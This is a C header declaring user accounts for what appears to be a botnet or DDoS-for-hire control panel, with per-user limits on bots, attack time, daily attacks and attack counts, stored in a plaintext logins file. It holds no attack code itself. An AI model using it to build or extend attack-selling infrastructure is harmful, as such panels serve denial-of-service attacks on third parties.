#pragma once

#include <time.h>

#define MAX_USERS 16

/* logins.txt: user pass maxtime maxbots admin maxdaily
   admin field: "admin" or "1" = admin, anything else = normal */
typedef struct {
    char user[50];
    char pass[50];
    int maxtime;
    int maxbots;
    int maxdaily;
    int is_admin;
    int is_logged_in;
    int attacks_today;
    time_t reset;
    char ip[32];
    time_t login_at;
    char current_theme[64];
} User;

extern User users[MAX_USERS];
extern int user_count;
extern int user_sockets[MAX_USERS];

void load_users(void);
/* returns user index, -1 bad login, -2 already connected */
int check_login(const char *user, const char *pass);
/* database/userlogs.txt: "[ts] user@ip: msg" */
void log_user(const char *user, const char *ip, const char *msg);
/* append new user to logins.txt + memory. 0 ok, -1 exists, -2 full, -3 file err */
int users_add(const char *user, const char *pass, int maxtime, int maxbots, int admin, int maxdaily);
/* remove user from logins.txt + reload. 0 ok, -1 not found/root, -2 file err */
int users_remove(const char *target);
